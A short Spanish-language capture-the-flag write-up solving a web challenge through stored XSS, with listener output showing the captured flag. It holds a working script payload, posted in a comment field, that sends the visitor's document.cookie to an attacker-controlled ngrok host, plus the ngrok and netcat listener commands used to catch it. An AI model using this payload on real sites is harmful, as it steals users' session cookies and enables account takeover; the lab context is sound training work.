
## Solucion

- es un XSS injection

- ponemos esto en los comentarios del post
```
<script>new Image().src="https://c2dd-177-242-158-39.ngrok.io/?c="+document.cookie;</script>
```

- Ponemos un listener de ngrok
```
┌──(kali㉿kali)-[~/Downloads]
└─$ ngrok http 80

ngrok                                                                                                (Ctrl+C to quit)
                                                                                                                     
Visit http://localhost:4040/ to inspect, replay, and modify your requests                                            
                                                                                                                     
Session Status                online                                                                                 
Account                       Hack (Plan: Free)                                                                      
Version                       3.1.0                                                                                  
Region                        United States (us)                                                                     
Latency                       123ms                                                                                  
Web Interface                 http://127.0.0.1:4040                                                                  
Forwarding                    https://c2dd-177-242-158-39.ngrok.io -> http://localhost:80                            
                                                                                                                     
Connections                   ttl     opn     rt1     rt5     p50     p90                                            
                              19      0       0.01    0.02    0.02    0.63                                           
                                                                                                                     
HTTP Requests                                                                                                        
-------------    
```

```netcat
┌──(kali㉿kali)-[~/…/11-29-adf-cyber-skills/web/cupakemagdalena/web_cupcake_magdalena]
└─$ nc -lnvp 80
listening on [any] 80 ...
connect to [127.0.0.1] from (UNKNOWN) [127.0.0.1] 41656
GET /?c=flag=HTB{r3fl3c73d_x55_4r3_d4ng3r0u5_4s_w3ll} HTTP/1.1
Host: c2dd-177-242-158-39.ngrok.io
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/100.0.4889.0 Safari/537.36
Accept: image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8
Accept-Encoding: gzip, deflate, br
Referer: http://127.0.0.1:1337/
Sec-Ch-Ua: 
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: 
Sec-Fetch-Dest: image
Sec-Fetch-Mode: no-cors
Sec-Fetch-Site: cross-site
X-Forwarded-For: 134.209.186.13
X-Forwarded-Proto: https
```